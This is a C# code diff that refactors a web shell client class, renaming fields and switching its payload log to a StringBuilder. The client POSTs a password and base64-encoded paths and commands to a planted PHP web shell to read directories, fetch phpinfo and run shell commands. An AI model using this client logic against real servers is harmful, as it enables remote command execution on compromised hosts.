@@ -1,4 +1,5 @@
-﻿using C2.Utils;
+﻿using C2.Core;
+using C2.Utils;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -8,33 +9,31 @@ using System.Web;
 
 namespace C2.Business.CastleBravo.WebShellTool
 {
-    public class WebShell
+    public class WebShellClient
     {
-        private string url;
-        private string pwd;
-        private WebShellVersionSetting versionSetting;
-        public List<string> PayloadLog;
+        private readonly string url;
+        private readonly string password;
+        private readonly WebShellClientSetting clientSetting;
+        private readonly StringBuilder sb;
+        public string PayloadLog { get => sb.ToString(); }
+        public void Clear() { sb.Clear(); }
+        private WebClientEx clientEX;
 
-        private WebClientEx client;
-
-        public WebShell(string address, string pVariable, string version)
+        public WebShellClient(string address, string password, string clientSetting)
         {
             this.url = address;
-            this.pwd = pVariable;
-            this.versionSetting = WebShellVersionSetting.LoadSetting(version);
-            PayloadLog = new List<string>();
+            this.password = password;
+            this.clientSetting = WebShellClientSetting.LoadSetting(clientSetting);
+            this.sb = new StringBuilder();
 
-            this.client = new WebClientEx();
-            client.Encoding = Encoding.Default;
+            this.clientEX = new WebClientEx();
+            clientEX.Encoding = Encoding.Default;
         }
 
         public Tuple<string, string> CurrentCmdExcute()
         {
             List<string> paths = PHPIndex();
-            if (paths.Count == 0)
-                return Tuple.Create(string.Empty, string.Empty);
-
-            return Tuple.Create(paths[0], string.Empty);
+            return paths.IsEmpty() ? Tuple.Create(string.Empty, string.Empty) : Tuple.Create(paths[0], string.Empty);
         }
 
         public Tuple<string, string> CmdExcute(string excutePath, string command)
@@ -85,11 +84,11 @@ namespace C2.Business.CastleBravo.WebShellTool
             foreach (string item in readDict.Split('\n'))
             {
                 string[] itemInfo = item.Split('\t');
-                if (itemInfo.Length != 4 || itemInfo[0] == "./" || itemInfo[0] == "../" || string.IsNullOrEmpty(itemInfo[0]))
+                if (itemInfo.Length < 4 || itemInfo[0].IsNullOrEmpty() || itemInfo[0] == "./" || itemInfo[0] == "../")
                     continue;
 
                 pathFiles.Add(new WSFile(itemInfo[0].EndsWith("/") ? WebShellFileType.Directory : WebShellFileType.File,
-                                         itemInfo[0].EndsWith("/") ? itemInfo[0].Substring(0, itemInfo[0].Length - 1) : itemInfo[0],
+                                         itemInfo[0].TrimEnd('/'),
                                          itemInfo[1],
                                          itemInfo[2],
                                          itemInfo[3]));
@@ -98,59 +97,59 @@ namespace C2.Business.CastleBravo.WebShellTool
         }
         public string PHPInfo()
         {
-            PayloadLog.Add("========获取php基础信息========");
-            return PHPPost(pwd + "=" + versionSetting.PHP_MAKE + "&" + versionSetting.ACTION + "=" + versionSetting.PHP_INFO);
+            sb.AppendLine("========获取php基础信息========");
+            return PHPPost(password + "=" + clientSetting.PHP_MAKE + "&" + clientSetting.ACTION + "=" + clientSetting.PHP_INFO);
         }
 
         private List<string> PHPIndex()
         {
-            PayloadLog.Add("========获取当前路径========");
-            string[] result = PHPPost(pwd + "=" + versionSetting.PHP_MAKE + "&" + versionSetting.ACTION + "=" + versionSetting.PHP_INDEX).Split('\t');
+            sb.AppendLine("========获取当前路径========");
+            string[] result = PHPPost(password + "=" + clientSetting.PHP_MAKE + "&" + clientSetting.ACTION + "=" + clientSetting.PHP_INDEX).Split('\t');
             return result.Skip(0).Take(result.Length - 1).ToList();
         }
 
         private string PHPReadDict(string path)
         {
-            PayloadLog.Add("========获取" + path + "文件========");
-            return PHPPost(pwd + "=" + versionSetting.PHP_MAKE + "&" + versionSetting.ACTION + "=" + versionSetting.PHP_READDICT + "&" + versionSetting.PARAM1 + "=" + TransStringToBase64(path));
+            sb.AppendLine("========获取" + path + "文件========");
+            return PHPPost(password + "=" + clientSetting.PHP_MAKE + "&" + clientSetting.ACTION + "=" + clientSetting.PHP_READDICT + "&" + clientSetting.PARAM1 + "=" + TransStringToBase64(path));
         }
 
         private string PHPShell(string cmdPath, string combineCommand, string oriCommand)
         {
-            PayloadLog.Add("========执行命令：" + oriCommand + "========");
-            return PHPPost(pwd + "=" + versionSetting.PHP_MAKE + "&" + 
-                            versionSetting.ACTION + "=" + versionSetting.PHP_SHELL + "&" + 
-                            versionSetting.PARAM1 + "=" + TransStringToBase64(cmdPath) + "&" +
-                            versionSetting.PARAM2 + "=" + TransStringToBase64(combineCommand));
+            sb.AppendLine("========执行命令：" + oriCommand + "========");
+            return PHPPost(password + "=" + clientSetting.PHP_MAKE + "&" + 
+                            clientSetting.ACTION + "=" + clientSetting.PHP_SHELL + "&" + 
+                            clientSetting.PARAM1 + "=" + TransStringToBase64(cmdPath) + "&" +
+                            clientSetting.PARAM2 + "=" + TransStringToBase64(combineCommand));
         }
 
         private string PHPPost(string payload)
         {
-            client.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
+            clientEX.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
 
             byte[] postData = Encoding.Default.GetBytes(payload);
             string result = string.Empty;
 
             try
             {
-                client.Timeout = 30000;//30秒超时
+                clientEX.Timeout = 30000;//30秒超时
                 using (GuarderUtil.WaitCursor)
                 {
-                    byte[] responseData = client.UploadData(url, "POST", postData);//得到返回字符流  
+                    byte[] responseData = clientEX.UploadData(url, "POST", postData);//得到返回字符流  
                     result = Encoding.Default.GetString(responseData);//解码 
                 }
 
                 foreach (string kv in payload.Split('&'))
                 {
-                    PayloadLog.Add(kv);
+                    sb.AppendLine(kv);
                 }
             }
             catch (Exception ex)
             {
-                PayloadLog.Add(ex.Message);
+                sb.AppendLine(ex.Message);
             }
 
-            return MidStrEx(result, versionSetting.SPL, versionSetting.SPR);
+            return MidStrEx(result, clientSetting.SPL, clientSetting.SPR);
         }
 
         private string MidStrEx(string sourse, string startstr, string endstr)
